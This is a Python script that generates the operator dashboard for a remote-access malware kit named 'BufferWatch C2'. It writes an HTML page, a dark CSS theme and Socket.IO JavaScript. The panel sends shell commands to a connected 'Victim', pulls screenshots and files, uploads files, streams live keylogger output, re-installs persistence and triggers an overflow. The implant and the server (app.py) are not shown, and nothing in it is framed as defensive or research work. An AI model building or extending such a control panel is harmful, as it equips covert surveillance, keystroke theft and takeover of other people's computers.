import os

# ----- Create directories -----
folders = [
    "templates",
    "static/css",
    "static/js",
    "screenshots",
    "downloads",
    "uploads",
    "keylogs"
]
for f in folders:
    os.makedirs(f, exist_ok=True)

# ----- index.html -----
html_content = r"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BufferWatch Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/dark-theme.css">
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
</head>
<body>
    <nav class="navbar navbar-dark">
        <div class="container-fluid">
            <span class="navbar-brand mb-0 h1">🛡️ BufferWatch C2</span>
            <span id="status-indicator" class="status-disconnected"></span>
            <span id="status-text" class="text-muted">Disconnected</span>
        </div>
    </nav>
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-2 sidebar p-3">
                <h6 class="text-muted">Quick Commands</h6>
                <button class="btn btn-blue btn-sm w-100 mb-1" onclick="sendCmd('dir')">dir</button>
                <button class="btn btn-blue btn-sm w-100 mb-1" onclick="sendCmd('cd ..')">cd ..</button>
                <button class="btn btn-blue btn-sm w-100 mb-1" onclick="sendCmd('systeminfo')">systeminfo</button>
                <button class="btn btn-green btn-sm w-100 mb-1" onclick="sendCmd('screenshot')">Screenshot</button>
                <button class="btn btn-green btn-sm w-100 mb-1" onclick="promptDownload()">Download File</button>
                <button class="btn btn-green btn-sm w-100 mb-1" onclick="document.getElementById('uploadModal').style.display='block'">Upload File</button>
                <button class="btn btn-red btn-sm w-100 mb-1" onclick="sendCmd('keylog_start')">Start Keylogger</button>
                <button class="btn btn-red btn-sm w-100 mb-1" onclick="sendCmd('persist')">Re‑install Persistence</button>
                <button class="btn btn-red btn-sm w-100 mb-1" onclick="sendCmd('vuln test')">Trigger Overflow</button>
            </div>
            <div class="col-md-7 p-3">
                <h5>Command Output</h5>
                <div id="output" class="output-area"></div>
                <div class="input-group mt-3">
                    <input type="text" id="cmd-input" class="form-control bg-dark text-light" placeholder="Enter command...">
                    <button class="btn btn-outline-light" onclick="sendCustomCmd()">Send</button>
                </div>
                <div id="screenshot-container" class="mt-3"></div>
            </div>
            <div class="col-md-3 p-3">
                <h5>Keylogger Live</h5>
                <div id="keylog-output" class="output-area" style="height: 300px;"></div>
                <button class="btn btn-outline-danger btn-sm mt-2 w-100" onclick="clearKeylog()">Clear View</button>
            </div>
        </div>
    </div>
    <div id="uploadModal" class="modal" tabindex="-1" style="display:none;">
      <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content bg-dark text-light">
          <div class="modal-header">
            <h5 class="modal-title">Upload File to Victim</h5>
            <button type="button" class="btn-close btn-close-white" onclick="document.getElementById('uploadModal').style.display='none'"></button>
          </div>
          <div class="modal-body">
            <input type="file" id="uploadFileInput" class="form-control mb-2">
            <button class="btn btn-green" onclick="uploadFile()">Upload & Send</button>
          </div>
        </div>
      </div>
    </div>
    <script src="/static/js/main.js"></script>
</body>
</html>"""

with open("templates/index.html", "w", encoding="utf-8") as f:
    f.write(html_content)

# ----- dark-theme.css -----
css_content = r"""body {
    background-color: #1a1a1a;
    color: #e0e0e0;
}
.navbar-dark {
    background-color: #0d1b2a !important;
}
.btn-blue {
    background-color: #1e90ff;
    border-color: #1e90ff;
    color: white;
}
.btn-green {
    background-color: #2e8b57;
    border-color: #2e8b57;
    color: white;
}
.btn-red {
    background-color: #b22222;
    border-color: #b22222;
    color: white;
}
.output-area {
    background-color: #0f0f0f;
    color: #00ff7f;
    font-family: 'Courier New', monospace;
    padding: 15px;
    border-radius: 5px;
    height: 400px;
    overflow-y: auto;
    white-space: pre-wrap;
    border: 1px solid #2a2a2a;
}
#status-indicator {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    display: inline-block;
    margin-right: 5px;
}
.status-connected {
    background-color: #00ff00;
}
.status-disconnected {
    background-color: #ff0000;
}
.sidebar {
    background-color: #121212;
    border-right: 1px solid #2a2a2a;
}"""

with open("static/css/dark-theme.css", "w", encoding="utf-8") as f:
    f.write(css_content)

# ----- main.js -----
js_content = r"""const socket = io();
const outputDiv = document.getElementById('output');
const keylogDiv = document.getElementById('keylog-output');
const statusIndicator = document.getElementById('status-indicator');
const statusText = document.getElementById('status-text');

socket.on('status', (data) => {
    if (data.connected) {
        statusIndicator.className = 'status-connected';
        statusText.textContent = `Connected to ${data.target}`;
    } else {
        statusIndicator.className = 'status-disconnected';
        statusText.textContent = 'Disconnected';
    }
});

socket.on('response', (data) => {
    outputDiv.innerHTML += `<div>${data.text}</div>`;
    outputDiv.scrollTop = outputDiv.scrollHeight;
});

socket.on('screenshot', (data) => {
    const img = document.createElement('img');
    img.src = 'data:image/bmp;base64,' + data.data;
    img.className = 'img-fluid mt-2';
    document.getElementById('screenshot-container').innerHTML = '';
    document.getElementById('screenshot-container').appendChild(img);
});

socket.on('download', (data) => {
    const byteString = atob(data.data);
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    const blob = new Blob([ab]);
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = data.filename;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    outputDiv.innerHTML += `<div>Downloaded: ${data.filename}</div>`;
});

socket.on('keylog_data', (data) => {
    keylogDiv.innerHTML += data.data;
    keylogDiv.scrollTop = keylogDiv.scrollHeight;
});

function sendCmd(cmd) {
    socket.emit('command', { cmd: cmd });
}

function sendCustomCmd() {
    const input = document.getElementById('cmd-input');
    const cmd = input.value;
    if (cmd) {
        sendCmd(cmd);
        input.value = '';
    }
}

function promptDownload() {
    const filename = prompt('Enter remote file path to download:');
    if (filename) {
        sendCmd('download ' + filename);
    }
}

function uploadFile() {
    const fileInput = document.getElementById('uploadFileInput');
    const file = fileInput.files[0];
    if (!file) return;
    const formData = new FormData();
    formData.append('file', file);
    fetch('/upload_file', { method: 'POST', body: formData })
        .then(res => {
            if (res.ok) {
                sendCmd('upload ' + file.name);
                document.getElementById('uploadModal').style.display = 'none';
                fileInput.value = '';
            }
        });
}

function clearKeylog() {
    keylogDiv.innerHTML = '';
}

document.getElementById('cmd-input').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') sendCustomCmd();
});"""

with open("static/js/main.js", "w", encoding="utf-8") as f:
    f.write(js_content)

print("✅ All files created successfully!")
print("You can now run: python app.py")